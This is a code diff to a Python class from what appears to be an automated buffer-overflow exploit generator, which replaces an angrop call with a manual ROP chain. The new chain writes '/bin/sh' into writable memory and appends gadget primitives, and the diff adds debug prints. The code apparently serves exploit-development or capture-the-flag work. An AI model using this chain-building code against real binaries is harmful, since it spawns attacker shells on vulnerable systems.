@@ -23,14 +23,31 @@ class ROP:
         self.cache_angrop = b''
 
     def write_binsh_to_mem(self):
-        if self.cache_angrop == b'':
-            angr_proj = angr.Project(self.analysis.binary)
-            angr_rop  = angr_proj.analyses.ROP()
-            angr_rop.find_gadgets_single_threaded() 
-            #angr_rop.find_gadgets()
-            self.analysis.hbsh = True
-            self.cache_angrop = angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
-        return self.cache_angrop
+        #prim = self.get_primitives_str()
+        #value_reg = self.get_primitive_regs()[1]
+        #point_reg = self.get_primitive_regs()[0]
+        #print(value_reg)
+        #print(point_reg)
+        #chain = b""
+        #chain += self.fill_reg(value_reg, b'/bin/sh\0')
+        #chain += self.fill_reg(point_reg, self.get_writeable_mem())
+        #print(self.write_binsh())
+        
+        self.analysis.hbsh = True
+        return self.write_binsh_manual()
+
+
+
+
+
+        #if self.cache_angrop == b'':
+        #    angr_proj = angr.Project(self.analysis.binary)
+        #    angr_rop  = angr_proj.analyses.ROP()
+        #    angr_rop.find_gadgets_single_threaded() 
+        #    #angr_rop.find_gadgets()
+        #    self.analysis.hbsh = True
+        #    self.cache_angrop = angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
+        #return self.cache_angrop
     
     def build_exploit(self, failed=False):
         self.fart_print.info("Attempting to discover the constraints to exploiting the buffer overflow")
@@ -58,6 +75,7 @@ class ROP:
         else:
             self.fart_print.warning("Exploit not found!")
         
+        print(payload)
         return payload
     
     def set_offset(self):
@@ -265,11 +283,23 @@ class ROP:
         return self.analysis.elf.sym['__data_start']
     
     # writes /bin/sh into memory
-    def write_binsh(self):
+    def write_binsh_manual(self):
+        print("buffer length is "+str(len(self.set_offset())))
         ret = b''
-        ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
+
+
+        
         ret += self.fill_reg(self.get_primitive_regs()[1].strip(' '), '/bin/sh\0')
+        print("putting /bin/sh in " + self.get_primitive_regs()[1].strip(' '))
+
+        ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
+        print("putting writable mem in " + self.get_primitive_regs()[0].strip(' '))
+
+
         ret += self.get_primitives()
+        print(self.get_primitives())
+
+        ret += p64(0)*2 # temp need geniric add zero
         return ret
             
     def one_gadget(self):
